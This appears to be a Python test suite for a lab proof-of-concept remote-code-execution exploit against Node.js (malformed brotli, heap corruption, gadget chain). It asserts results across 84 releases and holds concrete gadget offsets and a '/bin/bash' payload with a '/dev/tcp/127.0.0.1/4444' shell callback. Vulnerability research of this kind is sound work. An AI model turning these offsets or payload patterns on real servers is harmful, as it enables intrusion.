import hashlib
import importlib.util
import json
from pathlib import Path
import re
import struct
import sys
import unittest


ROOT = Path(__file__).parents[1]
MODULE_PATH = ROOT / "poc" / "node2shell_lab.py"
SPEC = importlib.util.spec_from_file_location("node2shell_lab", MODULE_PATH)
MODULE = importlib.util.module_from_spec(SPEC)
assert SPEC.loader is not None
sys.modules[SPEC.name] = MODULE
SPEC.loader.exec_module(MODULE)

HEAP_PATH = ROOT / "poc" / "node2shell_heap.py"
HEAP_SPEC = importlib.util.spec_from_file_location("node2shell_heap", HEAP_PATH)
HEAP = importlib.util.module_from_spec(HEAP_SPEC)
assert HEAP_SPEC.loader is not None
sys.modules[HEAP_SPEC.name] = HEAP
HEAP_SPEC.loader.exec_module(HEAP)

SELECTOR_PATH = ROOT / "poc" / "heap_layout_selector.py"
SELECTOR_SPEC = importlib.util.spec_from_file_location("heap_layout_selector", SELECTOR_PATH)
SELECTOR = importlib.util.module_from_spec(SELECTOR_SPEC)
assert SELECTOR_SPEC.loader is not None
sys.modules[SELECTOR_SPEC.name] = SELECTOR
SELECTOR_SPEC.loader.exec_module(SELECTOR)

PIE_LEAK_PATH = ROOT / "tools" / "investigate_pie_leak.py"
PIE_LEAK_SPEC = importlib.util.spec_from_file_location("investigate_pie_leak", PIE_LEAK_PATH)
PIE_LEAK = importlib.util.module_from_spec(PIE_LEAK_SPEC)
assert PIE_LEAK_SPEC.loader is not None
sys.modules[PIE_LEAK_SPEC.name] = PIE_LEAK
PIE_LEAK_SPEC.loader.exec_module(PIE_LEAK)


class PocTests(unittest.TestCase):
    def test_trigger_fingerprint(self):
        trigger = MODULE.malformed_brotli(b"")
        self.assertEqual(hashlib.sha256(trigger).hexdigest(), MODULE.TRIGGER_SHA256)

    def test_stage_one_is_fixed_to_proof_program(self):
        stage = MODULE.build_stage_one(MODULE.Profile.load())
        self.assertNotIn(b"/bin/sh", stage)
        self.assertNotIn(b"/usr/bin/id", stage)

    def test_ring_writer_uses_final_wrapped_prefix_occurrence(self):
        controlled = bytearray(1031)
        MODULE._write_ring(controlled, 0x3FC, b"ABCDEFGH", 0x400)
        self.assertEqual(controlled[0x3FC:0x400], b"ABCD")
        self.assertEqual(controlled[0x400:0x404], b"EFGH")
        self.assertEqual(controlled[:4], b"\0" * 4)

    def test_verifier_requires_matching_process_token_and_id(self):
        token = b"a" * 32
        response = b"N2S-PROOF:" + token + b"\nuid=1000(node) gid=1000(node)\n"
        self.assertIsNotNone(MODULE.verify(response, token))
        self.assertIsNone(MODULE.verify(response, b"b" * 32))
        self.assertIsNone(MODULE.verify(b"N2S-PROOF:" + token, token))
        self.assertEqual(MODULE.classify_response(response, MODULE.verify(response, token)), "rce-proof")
        self.assertEqual(MODULE.classify_response(b"", None), "connection-closed-or-crash")

    def test_heap_proof_is_fixed_to_loopback_and_id(self):
        profile = HEAP.HeapProfile(
            version="24.9.0",
            node_binary_sha256="a" * 64,
            bss_payload=0x6E948A0,
            callback_gadget=0x1062840,
            execvp_plt=0xF3ED60,
            callback_pointer_offset=0x08,
            context_pointer_offset=0x20,
            poison_staged_position=-0x800A080,
            record_size=0x330,
            tcache_index=50,
            ring_from_heap=0x800AB70,
        )
        payload = HEAP.build_fixed_proof(profile, "N2S_" + "b" * 32)
        self.assertIn(b"/bin/bash\0", payload)
        self.assertIn(b"/usr/bin/id", payload)
        self.assertIn(b"/dev/tcp/127.0.0.1/4444", payload)
        self.assertNotIn(b"host.docker.internal", payload)

    def test_heap_layout_selector_covers_verified_binary_fingerprints(self):
        index = SELECTOR.verified_fingerprint_index()
        self.assertEqual(len(index), 84)
        for digest, match in index.items():
            selected = SELECTOR.select_layouts(digest)
            self.assertEqual(selected[0]["selection"], "verified-binary-fingerprint")
            self.assertEqual(selected[0]["name"], match["layout"])
            self.assertEqual(selected[0]["matched_version"], match["version"])
        unknown = SELECTOR.select_layouts("f" * 64)
        self.assertTrue(unknown)
        self.assertTrue(
            all(item["selection"] == "allowlisted-fallback" for item in unknown)
        )

    def test_fragmented_sender_preserves_bytes_and_bounds(self):
        class Sink:
            def __init__(self):
                self.parts = []

            def sendall(self, value):
                self.parts.append(value)

        sink = Sink()
        HEAP.send_fragmented(sink, b"abcdefgh", 3)
        self.assertEqual(sink.parts, [b"abc", b"def", b"gh"])
        with self.assertRaises(ValueError):
            HEAP.send_fragmented(sink, b"x", 4097)

    def test_stage_two_keeps_expected_corruption_fields(self):
        stage = MODULE.build_stage_two(0x137ED748, 256)
        self.assertEqual(stage[7], 8)
        self.assertEqual(stage[15:19], bytes.fromhex("48d77e13"))
        self.assertEqual(stage[19:27], bytes.fromhex("ffffff7fffffff7f"))

    def test_matrix_artifacts_cover_every_official_linux_x64_release(self):
        profile_paths = sorted((ROOT / "poc" / "profiles").glob("*.json"))
        evidence_paths = sorted(
            path
            for path in (ROOT / "evidence" / "matrix").glob("*.json")
            if path.name != "summary.json"
        )
        self.assertEqual(len(profile_paths), 84)
        self.assertEqual(
            [path.stem for path in profile_paths],
            [path.stem for path in evidence_paths],
        )
        self.assertEqual(
            {major: sum(path.stem.startswith(f"{major}.") for path in profile_paths)
             for major in (22, 24, 26)},
            {22: 36, 24: 30, 26: 18},
        )

        sha256 = re.compile(r"[0-9a-f]{64}")
        for profile_path, evidence_path in zip(profile_paths, evidence_paths):
            profile = json.loads(profile_path.read_text(encoding="utf-8"))
            evidence = json.loads(evidence_path.read_text(encoding="utf-8"))
            self.assertEqual(profile["chain_version"], 4, profile_path.name)
            self.assertEqual(profile["pivot_mode"], "saved_rbp_leave", profile_path.name)
            self.assertEqual(profile["target"], "127.0.0.1:3000", profile_path.name)
            self.assertEqual(evidence["version"], profile_path.stem, evidence_path.name)
            self.assertEqual(evidence["result"], "rce-verified", evidence_path.name)
            self.assertEqual(evidence["proof_channel"], "exploited HTTP request socket")
            self.assertRegex(evidence["official_archive_sha256"], sha256)
            self.assertRegex(evidence["node_binary_sha256"], sha256)
            self.assertEqual(
                evidence["node_binary_sha256"], profile["node_binary_sha256"]
            )
            MODULE.build_stage_one(MODULE.Profile(profile))

        summary = json.loads(
            (ROOT / "evidence" / "matrix" / "summary.json").read_text(encoding="utf-8")
        )
        self.assertTrue(summary["complete"])
        self.assertEqual(summary["official_affected_linux_x64_release_count"], 84)
        self.assertEqual(summary["rce_verified_count"], 84)
        self.assertEqual(summary["failed_or_unverified"], {})

    def test_aslr_debugger_steered_evidence_is_complete_and_explicit(self):
        direct_dir = ROOT / "evidence" / "matrix"
        aslr_dir = ROOT / "evidence" / "aslr-on-debugger-steered"
        direct_paths = sorted(
            path for path in direct_dir.glob("*.json") if path.name != "summary.json"
        )
        aslr_paths = sorted(
            path for path in aslr_dir.glob("*.json") if path.name != "summary.json"
        )
        self.assertEqual(len(aslr_paths), 84)
        self.assertEqual(
            [path.stem for path in aslr_paths],
            [path.stem for path in direct_paths],
        )
        for direct_path, aslr_path in zip(direct_paths, aslr_paths):
            direct = json.loads(direct_path.read_text(encoding="utf-8"))
            aslr = json.loads(aslr_path.read_text(encoding="utf-8"))
            self.assertEqual(aslr["version"], aslr_path.stem)
            self.assertEqual(aslr["result"], "rce-verified", aslr_path.name)
            self.assertEqual(aslr["node_binary_sha256"], direct["node_binary_sha256"])
            self.assertEqual(
                aslr["verification_mode"],
                "official-linux-x64-aslr-enabled-debugger-steered-isolated-docker",
            )
            self.assertEqual(aslr["lab_controls"]["aslr"], "enabled")
            self.assertIn("not an ASLR bypass", aslr["calibration"]["steering"])
            self.assertEqual(
                aslr["proof_marker"],
                "N2S-PROOF:" + aslr["calibration_token_before_verify"],
            )
            self.assertRegex(aslr["proof_stdout"], r"^uid=\d+")

        summary = json.loads((aslr_dir / "summary.json").read_text(encoding="utf-8"))
        self.assertTrue(summary["complete"])
        self.assertEqual(summary["rce_verified_count"], 84)
        self.assertEqual(summary["failed_or_unverified"], {})
        self.assertEqual(
            summary["verification_mode"],
            "official-linux-x64-aslr-enabled-debugger-steered-isolated-docker",
        )

    def test_aslr_network_only_evidence_is_complete_and_gdb_free(self):
        direct_dir = ROOT / "evidence" / "matrix"
        network_dir = ROOT / "evidence" / "aslr-on-network-only"
        direct_paths = sorted(
            path for path in direct_dir.glob("*.json") if path.name != "summary.json"
        )
        network_paths = sorted(
            path for path in network_dir.glob("*.json") if path.name != "summary.json"
        )
        self.assertEqual(len(network_paths), 84)
        self.assertEqual(
            [path.stem for path in network_paths],
            [path.stem for path in direct_paths],
        )
        token = re.compile(r"N2S_[0-9a-f]{32}")
        for direct_path, network_path in zip(direct_paths, network_paths):
            direct = json.loads(direct_path.read_text(encoding="utf-8"))
            network = json.loads(network_path.read_text(encoding="utf-8"))
            controls = network["lab_controls"]
            self.assertEqual(network["version"], network_path.stem)
            self.assertEqual(network["result"], "rce-verified", network_path.name)
            self.assertEqual(network["node_binary_sha256"], direct["node_binary_sha256"])
            self.assertEqual(
                network["verification_mode"],
                "official-linux-x64-aslr-enabled-network-only-worker-heap",
            )
            self.assertEqual(controls["kernel_randomize_va_space"], 2)
            self.assertFalse(controls["debugger_used"])
            self.assertFalse(controls["address_read_used"])
            self.assertFalse(controls["ld_preload_present"])
            self.assertEqual(controls["target"], "127.0.0.1:3000")
            self.assertEqual(controls["callback"], "127.0.0.1:4444")
            self.assertRegex(network["proof_token"], token)
            self.assertRegex(network["proof_stdout"], r"^uid=\d+")
            self.assertEqual(int(network["profile"]["bss_payload"], 0) & 0xF, 0)

        summary = json.loads((network_dir / "summary.json").read_text(encoding="utf-8"))
        self.assertTrue(summary["complete"])
        self.assertEqual(summary["rce_verified_count"], 84)
        self.assertEqual(summary["failed_or_unverified"], {})
        self.assertFalse(summary["debugger_used"])
        self.assertFalse(summary["address_read_used"])

    def test_runtime_scenario_evidence_reports_raw_and_retried_rates(self):
        scenario_dir = ROOT / "evidence" / "runtime-scenarios"
        summary = json.loads((scenario_dir / "summary.json").read_text(encoding="utf-8"))
        self.assertTrue(summary["complete"])
        self.assertEqual(summary["versions"], ["22.23.3", "24.22.0", "26.12.0"])
        self.assertEqual(summary["total_successes"], 54)
        self.assertEqual(summary["total_trials"], 54)
        self.assertEqual(summary["first_attempt_successes"], 48)
        self.assertEqual(summary["total_attempts"], 60)
        self.assertFalse(summary["debugger_used"])
        self.assertFalse(summary["address_read_used"])
        for version in summary["versions"]:
            record = json.loads(
                (scenario_dir / f"{version}.json").read_text(encoding="utf-8")
            )
            self.assertEqual(len(record["trials"]), 18)
            self.assertEqual(
                record["selected_profile"]["layout_selection"],
                "verified-binary-fingerprint",
            )
            self.assertFalse(record["lab_controls"]["debugger_used"])
            self.assertFalse(record["lab_controls"]["address_read_used"])
            for trial in record["trials"]:
                self.assertEqual(trial["outcome"], "rce-proof")
                self.assertLessEqual(trial["attempt_count"], 3)
                successful = trial["attempts"][-1]
                self.assertEqual(successful["outcome"], "rce-proof")
                self.assertRegex(successful["proof_token"], r"^N2S_[0-9a-f]{32}$")
                self.assertRegex(successful["proof_stdout"], r"^uid=1000")
                self.assertEqual(successful["runtime"]["kernel_randomize_va_space"], 2)
                self.assertFalse(successful["runtime"]["ld_preload_present"])

    def test_pie_maps_parser_and_stable_candidate_rule(self):
        mappings = PIE_LEAK.parse_maps(
            "555500000000-555500001000 r--p 00000000 08:01 1 /usr/local/bin/node\n"
            "555500001000-555500003000 r-xp 00001000 08:01 1 /usr/local/bin/node\n"
            "7f0000000000-7f0000010000 rw-p 00000000 00:00 0 [heap]\n"
        )
        self.assertEqual(PIE_LEAK.node_load_bias(mappings), 0x555500000000)
        sample = bytearray(PIE_LEAK.RECORD_SIZE)
        struct.pack_into("<Q", sample, 0x18, 0x555500001234)
        analyzed = PIE_LEAK.analyze_capture(bytes(sample), mappings)
        self.assertEqual(analyzed["mapped_qword_counts"]["node-image"], 1)
        self.assertEqual(
            analyzed["node_image_candidates"][0]["image_offset"], "0x1234"
        )
        first = {"node_image_candidates": analyzed["node_image_candidates"]}
        second = {"node_image_candidates": analyzed["node_image_candidates"]}
        stable = PIE_LEAK.stable_candidates([first, second])
        self.assertEqual(len(stable), 1)
        self.assertEqual(stable[0]["trials_observed"], 2)

    def test_pie_leak_evidence_separates_feasibility_from_rce(self):
        evidence_dir = ROOT / "evidence" / "pie-address-leak"
        summary = json.loads((evidence_dir / "summary.json").read_text(encoding="utf-8"))
        survey = json.loads((evidence_dir / "24.22.0.json").read_text(encoding="utf-8"))
        relocated = json.loads(
            (evidence_dir / "relocated-chain-24.22.0.json").read_text(encoding="utf-8")
        )
        oracle = json.loads(
            (evidence_dir / "oracle-control-24.22.0.json").read_text(encoding="utf-8")
        )

        self.assertEqual(
            summary["result"], "pie-address-leak-feasible-rce-not-yet-verified"
        )
        self.assertEqual(survey["binary"]["elf_type"], "ET_DYN")
        self.assertEqual(survey["trial_count"], 100)
        self.assertEqual(survey["distinct_node_load_bias_count"], 100)
        self.assertEqual(survey["result"], "usable-node-image-leak-observed")
        self.assertFalse(survey["method"]["debugger_used"])
        self.assertFalse(survey["method"]["oracle_address_fed_to_request"])
        split = survey["stable_node_image_candidates"]["split_stream"]
        self.assertTrue(
            any(
                item["record_offset"] == "0x68"
                and item["image_offset"] == "0x3cb2b1a"
                and item["trials_observed"] >= 2
                for item in split
            )
        )

        network = relocated["relocated_chain"]
        self.assertEqual(network["result"], "rce-not-verified")
        self.assertFalse(network["debugger_used"])
        self.assertFalse(network["runtime_address_read_used"])
        self.assertEqual(len(network["attempts"]), 20)
        self.assertEqual(
            sum(item["leak_attempts"] is not None for item in network["attempts"]),
            13,
        )
        self.assertEqual(
            sum(item["outcome"] == "rce-proof" for item in network["attempts"]),
            0,
        )
        control = oracle["oracle_relocated_chain"]
        self.assertTrue(control["runtime_address_read_used"])
        self.assertEqual(control["result"], "rce-not-verified")
        self.assertEqual(len(control["attempts"]), 3)


if __name__ == "__main__":
    unittest.main()
